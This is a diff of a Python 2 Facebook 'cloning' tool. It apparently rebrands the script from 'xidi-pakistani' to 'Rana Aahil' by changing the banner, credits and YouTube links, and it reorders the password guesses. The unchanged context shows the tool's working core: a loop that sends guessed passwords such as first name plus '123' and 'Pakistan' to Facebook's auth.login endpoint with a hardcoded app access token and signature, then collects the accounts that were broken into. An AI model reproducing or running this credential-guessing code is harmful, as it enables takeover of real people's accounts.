@@ -61,20 +61,18 @@ def trb():
 
 ##### LOGO #####
 logo='''
-\033[1;92m ┈┈┈┈╱▔▔▔▔╲┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈╱▔▔▔▔╲┈┈┈┈
-\033[1;92m ┈┈┈▕▕╲┊┊╱▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕╲┊┊╱▏▏┈┈┈
-\033[1;92m ┈┈┈▕▕▂╱╲▂▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕▂╱╲▂▏▏┈┈┈
-\033[1;92m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;96mXIDI-PAKISTANI.\033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈
-\033[1;92m ┈┈┈┈▕╲▂▂╱▏┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈▕╲▂▂╱▏┈┈┈┈
-\033[1;92m ╱▔▔▔▔┊┊┊┊▔▔▔▔╲☞☞☞☞☞☞\033[1;91m☜☜☜☜☜╱▔▔▔▔┊┊┊┊▔▔▔▔╲
-\033[1;92m................\033[1;96mXIDI-PAKISTANI\033[1;91m...............
-\033[1;92m................\033[1;96m✬🄵🄰🄲🄴🄱🄾🄾🄺✬\033[1;91m..............
+\033[1;95m╭━╮╭━┳━━━╮╭━━━┳━━━┳━━━╮
+\033[1;95m┃┃╰╯┃┃╭━╮┃┃╭━╮┃╭━━┫╭━╮┃
+\033[1;95m┃╭╮╭╮┃╰━╯┃╰╯╭╯┃╰━━┫┃┃┃┃
+\033[1;95m┃┃┃┃┃┃╭╮╭╯╭╮╰╮┃╭━╮┃┃┃┃┃
+\033[1;95m┃┃┃┃┃┃┃┃╰╮┃╰━╯┃╰━╯┃╰━╯┃
+\033[1;95m╰╯╰╯╰┻╯╰━╯╰━━━┻━━━┻━━━╯
 
 \033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 
-\033[1;91m☞ Auther     : xidi-pakistani✅
-\033[1;92m☞ Facebook : Muhammad Ibtasam
-\033[1;95m☞ YouTube    : https://youtu.be/KvfnSttarOo
+\033[1;93m☞ Auther     : Rana Aahil✅
+\033[1;93m☞ Facebook   : Aahil
+\033[1;93m☞ YouTube    : Aahil Creations
 
 \033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
                                 '''
@@ -105,7 +103,7 @@ def login():
 		    st.write(z["access_token"])
 		    st.close()
 		    print (S + '[☆]' + Y + ' Login successfull 100% ✓')
-		    os.system('xdg-open https://youtu.be/KvfnSttarOo')
+		    os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
 		    menu()
 		else:
 		    if "www.facebook.com" in z["error_msg"]:
@@ -145,9 +143,9 @@ def menu():
 	print
 	print (S + 50*'-')
 	print
-	print (S + '[' + P + '☞1' + S + ']' + S + ' Fast Cloning New Update')
-	print (S + '[' + P + '☞2' + S + ']' + S + ' Update XIDI PAKISTANI Tool')
-	print (S + '[' + P + '☞3' + S + ']' + S + ' XIDI-PAKISTANI')
+	print (S + '[' + P + '☞1' + S + ']' + S + ' CLONE FAST START')
+	print (S + '[' + P + '☞2' + S + ']' + S + ' UPDATING')
+	print (S + '[' + P + '☞3' + S + ']' + S + ' RANA AAHIL')
 	print (S + '[' + Y + '☞4' + S + ']' + G + ' Log Out')
 	print (S + '[' + Y + '☞0' + S + ']' + R + ' Exit')
 	print
@@ -181,15 +179,15 @@ def mb():
 	    psb('Frends login new Account✓')
 	    psb('facebook id M.Ibtasam✓')
 	    psb('WellCome To xidi-pakistani')
-	    psb('Congratulations XIDI-PAKISTANI Tool Has Been Updated Successfully')
+	    psb('Congratulations Ranas Tool Has Been Updated Successfully')
 	    psb('🔓User Name☆ xidi✓')
 	    psb('🔓Password ☆ pakistani✓')
-	    psb('Subscrib My Youtube Chenal xidi pakistani✓')
+	    psb('Subscrib My Youtube Chenal Aahil Creations✓')
 	    psb('Please Login Again')
 	    time.sleep(2)
-	    os.system('cd $HOME/xidi123 && python2 xidi.py')
+	    os.system('cd $HOME/xidi123 && python2 aahil.py')
 	elif bm =='3':
-	    os.system('xdg-open https://youtu.be/KvfnSttarOo')
+	    os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
 	    menu()
 	elif bm =='4':
 		psb('Token Has Been Removed')
@@ -291,7 +289,7 @@ def pb():
 			        print (G+'[OK] ♡ '+user+' ♡ '+ps1)
 			        oks.append(user+ps1)
 			    else:
-			        ps2=(j['first_name']+'123')
+			        ps2=('Pakistan')
 			        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			        k=json.load(dt)
 			        if 'www.facebook.com' in k['error_msg']:
@@ -324,7 +322,7 @@ def pb():
 			                                print(G+'[OK] ♡ '+user+' ♡ '+ps4)
 			                                oks.append(user+ps4)
 			                            else:
-			                                ps5=('Pakistan')
+			                                ps5=(j['first_name']+'123')
 			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                                k=json.load(dt)
 			                                if 'www.facebook.com' in k['error_msg']:
